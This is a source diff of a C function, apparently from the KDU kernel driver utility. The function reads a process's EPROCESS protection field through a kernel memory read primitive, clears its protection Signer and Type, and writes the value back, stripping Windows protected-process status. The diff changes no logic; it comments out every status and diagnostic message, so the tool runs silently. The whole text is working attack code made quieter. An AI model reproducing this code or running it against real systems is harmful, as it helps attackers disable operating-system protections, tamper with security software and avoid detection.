@@ -121,12 +121,12 @@ BOOL KDUControlProcess(
 
     if (NT_SUCCESS(ntStatus)) {
 
-        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
+        //printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
         supQueryObjectFromHandle(hProcess, &ProcessObject);
 
         if (ProcessObject != 0) {
 
-            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);
+            //printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);
 
             switch (Context->NtBuildNumber) {
             case NT_WIN8_BLUE:
@@ -162,37 +162,37 @@ BOOL KDUControlProcess(
 
             if (Offset == 0) {
 
-                supPrintfEvent(kduEventError,
-                    "[!] Unsupported WinNT version\r\n");
+                //supPrintfEvent(kduEventError,
+                //    "[!] Unsupported WinNT version\r\n");
 
             }
             else {
 
                 VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, Offset);
 
-                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);
+                //printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);
 
                 Buffer = 0;
                 if (KDUReadKernelVM(Context, VirtualAddress, &Buffer, sizeof(ULONG))) {
 
                     PsProtection = (PS_PROTECTION*)&Buffer;
 
-                    LPSTR pStr;
+                    //LPSTR pStr;
 
 
-                    printf_s("[+] Kernel memory read succeeded\r\n");
+                    //printf_s("[+] Kernel memory read succeeded\r\n");
 
-                    pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
-                    printf_s("\tPsProtection->Type: %lu (%s)\r\n",
-                        PsProtection->Type,
-                        pStr);
+                    //pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
+                    //printf_s("\tPsProtection->Type: %lu (%s)\r\n",
+                    //    PsProtection->Type,
+                    //    pStr);
 
-                    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
+                    //printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
 
-                    pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
-                    printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
-                        PsProtection->Signer,
-                        pStr);
+                    //pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
+                    //printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
+                    //    PsProtection->Signer,
+                    //    pStr);
 
                     PsProtection->Signer = PsProtectedSignerNone;
                     PsProtection->Type = PsProtectedTypeNone;
@@ -200,19 +200,19 @@ BOOL KDUControlProcess(
 
                     bResult = KDUWriteKernelVM(Context, VirtualAddress, &Buffer, sizeof(ULONG));
                     if (bResult) {
-                        printf_s("[+] Process object modified\r\n");
+                        //printf_s("[+] Process object modified\r\n");
 
-                        pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
-                        printf_s("\tNew PsProtection->Type: %lu (%s)\r\n",
-                            PsProtection->Type,
-                            pStr);
+                        //pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
+                        //printf_s("\tNew PsProtection->Type: %lu (%s)\r\n",
+                        //    PsProtection->Type,
+                        //    pStr);
 
-                        pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
-                        printf_s("\tNew PsProtection->Signer: %lu (%s)\r\n",
-                            PsProtection->Signer,
-                            pStr);
+                        //pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
+                        //printf_s("\tNew PsProtection->Signer: %lu (%s)\r\n",
+                        //    PsProtection->Signer,
+                        //    pStr);
 
-                        printf_s("\tNew PsProtection->Audit: %lu\r\n", PsProtection->Audit);
+                        //printf_s("\tNew PsProtection->Audit: %lu\r\n", PsProtection->Audit);
 
                     }
                     else {
